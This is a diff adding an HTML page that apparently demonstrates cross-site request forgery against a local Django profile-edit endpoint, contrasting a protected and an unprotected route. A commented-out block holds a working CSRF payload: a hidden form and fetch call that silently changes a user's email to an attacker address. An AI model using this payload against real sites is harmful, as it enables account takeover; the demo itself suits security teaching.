@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Evil/vs/Protected</title>
+</head>
+<body>
+
+
+Hello. I look like regular site, but I'm evil
+
+<form id="create" action="http://127.0.0.1:8000/web/edit/2/" method="post" enctype="multipart/form-data">
+    <h1>Edit Profile - Evil vs Protected Endpoint</h1>
+    <div style="display: flex; flex-direction: column">
+        <tr>
+            <th><label for="id_username">Username:</label></th>
+            <td>
+                <input type="text" name="username" maxlength="150" required id="id_username">
+                <br>
+                <span class="helptext">Required. 150 characters or fewer. Letters, digits and @/./+/-/_ only.</span>
+            </td>
+        </tr>
+        <tr>
+            <th><label for="id_email">Email address:</label></th>
+            <td>
+                <input type="email" name="email" maxlength="254" id="id_email">
+            </td>
+        </tr>
+        <input class="btn submit" type="submit" value="Save Changes">
+    </div>
+</form>
+
+
+
+{#    <form id="myform" action="http://127.0.0.1:8000/web/edit-no-csrft/2/" method="POST">#}
+{#        <input type="hidden" name="email" value="evil@evil-server.evl"/>#}
+{#    </form>#}
+{#    <script>#}
+{#        var form = document.getElementById("myform");#}
+{#        var data = new FormData(form);#}
+{#        fetch("http://127.0.0.1:8000/web/edit-no-csrft/2/", {method: "POST", body: data});#}
+{#    </script>#}
+
+
+</body>
+</html>
